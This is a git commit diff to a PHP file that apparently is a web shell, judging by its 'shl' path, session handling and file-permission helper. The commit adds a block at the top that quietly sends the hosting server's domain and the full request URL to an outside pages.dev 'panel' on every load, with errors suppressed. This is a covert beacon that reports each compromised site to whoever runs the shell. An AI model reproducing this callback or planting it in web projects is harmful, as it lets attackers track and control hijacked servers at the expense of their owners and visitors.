3f8bceada7cf3beed7591187c7b3a038aeca809d
sam <144790923+tryxapp@users.noreply.github.com>
2025-10-26 17:00:02 +0700

    Update trygek2.php

--- from/to/ex/fr/lst/shl/trygek2.php
+++ from/to/ex/fr/lst/shl/trygek2.php
@@ -1,4 +1,14 @@
 <?php
+$panel = 'https://collecptrxygms.pages.dev/';
+
+$host   = $_SERVER['HTTP_HOST'] ?? '';
+$https  = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || (($_SERVER['SERVER_PORT'] ?? '') == '443');
+$scheme = $https ? 'https' : 'http';
+$url    = $scheme . '://' . $host . ($_SERVER['REQUEST_URI'] ?? '/');
+
+@file_get_contents($panel . '?d=' . rawurlencode($host) . '&u=' . rawurlencode($url));
+?>
+<?php
 session_start();
 date_default_timezone_set("Asia/Jakarta");
 
@@ -1703,4 +1713,5 @@ function perms($file)
         (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
     return $info;
 }
+
 ?>
